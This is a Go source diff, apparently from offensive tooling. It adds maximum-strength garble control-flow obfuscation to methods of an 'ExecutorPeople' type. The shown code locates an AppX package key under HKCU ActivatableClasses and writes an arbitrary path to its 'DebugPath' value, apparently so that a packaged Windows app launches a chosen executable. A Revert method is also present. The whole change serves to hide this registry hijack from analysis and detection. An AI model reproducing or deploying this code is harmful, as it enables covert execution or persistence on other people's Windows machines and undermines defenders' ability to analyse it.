@@ -13,7 +13,7 @@ import (
 )
 
 type ExecutorPeople struct{}
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorPeople) findKey() (string, error) {
 	nk, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Classes\\ActivatableClasses\\Package", registry.READ)
 	if err != nil {
@@ -37,7 +37,7 @@ func (e ExecutorPeople) findKey() (string, error) {
 		subkeys[n], "DebugInformation\\x4c7a3b7dy2188y46d4ya362y19ac5a5805e5x.AppX368sbpk1kx658x0p332evjk2v0y02kxp.mca")
 	return key, nil
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorPeople) Exec(path string) error {
 	kpath, err := e.findKey()
 	if err != nil {
@@ -51,7 +51,7 @@ func (e ExecutorPeople) Exec(path string) error {
 	err = k.SetStringValue("DebugPath", path)
 	return err
 }
-
+//garble:controlflow flatten_passes=max junk_jumps=max block_splits=max flatten_hardening=xor,delegate_table
 func (e ExecutorPeople) Revert() error {
 	kpath, err := e.findKey()
 	if err != nil {
